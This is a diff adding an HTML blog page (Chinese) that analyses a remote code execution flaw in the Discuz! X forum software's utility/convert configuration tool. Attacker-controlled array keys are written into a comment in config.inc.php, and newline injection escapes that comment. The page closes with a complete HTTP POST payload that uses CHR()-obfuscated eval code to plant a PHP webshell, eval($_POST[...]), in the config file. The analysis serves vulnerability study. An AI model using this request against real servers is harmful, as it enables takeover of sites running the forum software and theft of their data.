@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Discuz! X 系列全版本，版本转换功能导致Getshell一、漏洞简介存在问题的代码在&#x2F;utility&#x2F;convert&#x2F;目录下，这部分的功能主要是用于Dz系列产品升级&#x2F;转换。 二、漏洞影响Discuz! X 全版本 三、复现过程漏洞分析入口utility&#x2F;convert&#x2F;index.php require &#39;.&#x2F;include&#x2F;common.inc.php&#39;;  $actio">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Discuz/Discuz!%20X%20%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%20%E7%89%88%E6%9C%AC%E8%BD%AC%E6%8D%A2%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4Getshell/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Discuz! X 系列全版本，版本转换功能导致Getshell一、漏洞简介存在问题的代码在&#x2F;utility&#x2F;convert&#x2F;目录下，这部分的功能主要是用于Dz系列产品升级&#x2F;转换。 二、漏洞影响Discuz! X 全版本 三、复现过程漏洞分析入口utility&#x2F;convert&#x2F;index.php require &#39;.&#x2F;include&#x2F;common.inc.php&#39;;  $actio">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Discuz!X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E7%89%88%E6%9C%AC%E8%BD%AC%E6%8D%A2%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4Getshell/media/rId26.png">
+<meta property="article:published_time" content="2022-07-08T06:25:54.591Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.675Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Discuz!X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E7%89%88%E6%9C%AC%E8%BD%AC%E6%8D%A2%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4Getshell/media/rId26.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Discuz/Discuz! X 系列全版本 版本转换功能导致Getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Discuz/Discuz!%20X%20%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%20%E7%89%88%E6%9C%AC%E8%BD%AC%E6%8D%A2%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4Getshell/" class="article-date">
+  <time datetime="2022-07-08T06:25:54.591Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Discuz-X-系列全版本，版本转换功能导致Getshell"><a href="#Discuz-X-系列全版本，版本转换功能导致Getshell" class="headerlink" title="Discuz! X 系列全版本，版本转换功能导致Getshell"></a>Discuz! X 系列全版本，版本转换功能导致Getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>存在问题的代码在<code>/utility/convert/</code>目录下，这部分的功能主要是用于Dz系列产品升级/转换。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Discuz! X 全版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>入口<code>utility/convert/index.php</code></p>
+<pre><code>require &#39;./include/common.inc.php&#39;;
+
+$action = getgpc(&#39;a&#39;);
+$action = empty($action) ? getgpc(&#39;action&#39;) : $action;
+$source = getgpc(&#39;source&#39;) ? getgpc(&#39;source&#39;) : getgpc(&#39;s&#39;);
+</code></pre>
+<p>取<code>$_POST[&#39;a&#39;]</code>,直接赋值给<code>$action</code>，此时<code>$action = config</code>;</p>
+<pre><code>&#125; elseif($action == &#39;config&#39; || CONFIG_EMPTY) &#123;      
+    require DISCUZ_ROOT.&#39;./include/do_config.inc.php&#39;;  
+&#125; elseif($action == &#39;setting&#39;) &#123;
+</code></pre>
+<p>满足条件，引入<code>./include/do_config.inc.php</code></p>
+<pre><code>@touch($configfile);
+ ......
+if(submitcheck()) &#123;
+    $newconfig = getgpc(&#39;newconfig&#39;);
+    if(is_array($newconfig)) &#123;
+        $checkarray = $setting[&#39;config&#39;][&#39;ucenter&#39;] ? array(&#39;source&#39;, &#39;target&#39;, &#39;ucenter&#39;) : array(&#39;source&#39;, &#39;target&#39;);
+        foreach ($checkarray as $key) &#123;
+      ......
+    &#125;
+    save_config_file($configfile, $newconfig, $config_default);
+</code></pre>
+<p><code>$newconfig</code>从<code>$_POST[newconfig]</code>获取数据，<code>save_config_file</code>函数保将<code>$newconfig</code>保存到<code>$configfile</code>文件中，即<code>config.inc.php</code>文件。跟进该函数。</p>
+<pre><code>function save_config_file($filename, $config, $default) &#123;
+    $config = setdefault($config, $default);// 将$config中的空白项用 $default 中对应项的值填充
+    $date = gmdate(&quot;Y-m-d H:i:s&quot;, time() + 3600 * 8);
+    $year = date(&#39;Y&#39;);
+    $content = &lt;&lt;&lt;EOT
+&lt;?php
+
+
+\$_config = array();
+
+EOT;
+    $content .= getvars(array(&#39;_config&#39; =&gt; $config));
+    $content .= &quot;\r\n// &quot;.str_pad(&#39;  THE END  &#39;, 50, &#39;-&#39;, STR_PAD_BOTH).&quot; //\r\n\r\n?&gt;&quot;;
+    file_put_contents($filename, $content);
+&#125;
+</code></pre>
+<p>getvars函数处理，此时的<code>$config</code> =<br><code>$newconfig+config.default.php对应项的补充</code>。看一下getvars函数：</p>
+<pre><code>function getvars($data, $type = &#39;VAR&#39;) &#123;
+    $evaluate = &#39;&#39;;
+    foreach($data as $key =&gt; $val) &#123;
+        if(!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $key)) &#123;
+            continue;
+        &#125;
+        if(is_array($val)) &#123;
+            $evaluate .= buildarray($val, 0, &quot;\$&#123;$key&#125;&quot;).&quot;\r\n&quot;;
+        &#125; else &#123;
+            $val = addcslashes($val, &#39;\&#39;\\&#39;);
+            $evaluate .= $type == &#39;VAR&#39; ? &quot;\$$key = &#39;$val&#39;;\n&quot; : &quot;define(&#39;&quot;.strtoupper($key).&quot;&#39;, &#39;$val&#39;);\n&quot;;
+        &#125;
+    &#125;
+    return $evaluate;
+&#125;
+</code></pre>
+<p>满足if条件会执行<code>buildarray</code>函数，此时<code>$key=_config</code>，<code>$val</code>=上面的<code>$config</code>。最终造成写入的在该函数中（update.php<br>2206行）：</p>
+<pre><code>foreach ($array as $key =&gt; $val) &#123;
+        if($level == 0) &#123;
+            //str_pad — 使用另一个字符串填充字符串为指定长度
+            // 第一个参数是要输出的字符串，指定长度为50，用&#39;-&#39;填充，居中
+            $newline = str_pad(&#39;  CONFIG &#39;.strtoupper($key).&#39;  &#39;, 50, &#39;-&#39;, STR_PAD_BOTH);
+            $return .= &quot;\r\n// $newline //\r\n&quot;;
+        &#125;
+</code></pre>
+<p>本意是使用<code>$config</code>数组的key作为每一块配置区域的&quot;注释标题&quot;，写入配置文件的$newline依赖于$key，而$key是攻击者可控的。</p>
+<p>未对输入数据进行正确的边界处理，导致可以插入换行符，逃离注释的作用范围，从而使输入数据转化为可执行代码。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在产品升级/转换-&gt;选择产品转换程序 -&gt;设置服务器信息 这里抓包，</p>
+<p>payload：</p>
+<pre><code>POST /dz/utility/convert/index.php HTTP/1.1
+Host: www.0-sec.org:8001
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 278
+Origin: http://127.0.0.1:8001
+Connection: close
+Referer: http://127.0.0.1:8001/dz/utility/convert/index.php
+Upgrade-Insecure-Requests: 1
+
+a=config&amp;source=d7.2_x1.5&amp;submit=yes&amp;newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(108).CHR(97).CHR(110).CHR(118).CHR(110).CHR(97).CHR(108).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]=aaaa
+</code></pre>
+<p><img src="/resource/Discuz!X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E7%89%88%E6%9C%AC%E8%BD%AC%E6%8D%A2%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4Getshell/media/rId26.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7492/#toc-18">https://xz.aliyun.com/t/7492\#toc-18</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Discuz/Discuz!%20X%20%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%20%E7%89%88%E6%9C%AC%E8%BD%AC%E6%8D%A2%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4Getshell/" data-id="cl5c2qnsl004uy8v1h9xvcbi4" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Discuz/Discuz!%20X3.1%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Discuz/Discuz!%20X%20%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%20%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
